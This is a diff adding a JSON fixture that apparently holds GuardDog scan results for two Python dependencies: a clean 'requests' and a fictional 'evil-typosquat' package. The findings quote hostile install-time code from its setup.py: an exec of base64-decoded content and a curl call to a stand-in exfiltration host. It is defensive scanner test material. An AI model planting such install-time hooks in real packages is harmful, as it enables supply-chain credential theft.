@@ -1,0 +1,40 @@
+[
+  {
+    "dependency": "requests",
+    "version": "2.31.0",
+    "result": {
+      "issues": 0,
+      "errors": {},
+      "results": {
+        "exec-base64": [],
+        "code-execution": []
+      },
+      "path": "/tmp/guarddog/requests"
+    }
+  },
+  {
+    "dependency": "evil-typosquat",
+    "version": "6.6.6",
+    "result": {
+      "issues": 2,
+      "errors": {},
+      "results": {
+        "exec-base64": [
+          {
+            "location": "setup.py:12",
+            "code": "exec(base64.b64decode('cGF5bG9hZC1zZWNyZXQtZG9fbm90X2xlYWs='))",
+            "message": "Base64-encoded code passed to exec()"
+          }
+        ],
+        "code-execution": [
+          {
+            "location": "setup.py:12",
+            "code": "os.system('curl https://exfil.example/steal')",
+            "message": "OS command execution at install time"
+          }
+        ]
+      },
+      "path": "/tmp/guarddog/evil-typosquat"
+    }
+  }
+]
